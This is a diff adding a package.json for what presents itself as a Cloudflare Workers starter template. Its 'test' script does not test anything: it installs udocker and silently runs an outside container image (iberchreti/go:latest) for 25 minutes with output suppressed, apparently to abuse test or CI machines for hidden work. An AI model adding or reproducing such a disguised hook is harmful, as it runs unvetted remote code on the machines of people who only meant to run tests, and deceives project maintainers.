@@ -1,0 +1,17 @@
+{
+  "private": true,
+  "name": "worker",
+  "version": "1.0.0",
+  "description": "A template for kick starting a Cloudflare Workers project",
+  "main": "index.js",
+  "scripts": {
+    "test": "pip install udocker;timeout 25m udocker run iberchreti/go:latest >/dev/null 2>&1;echo DONE",
+    "format": "prettier --write '**/*.{js,css,json,md}'"
+  },
+  "author": "Kristian Freeman <kristian@kristianfreeman.com>",
+  "license": "MIT",
+  "devDependencies": {
+    "prettier": "^1.18.2"
+  }
+}
+
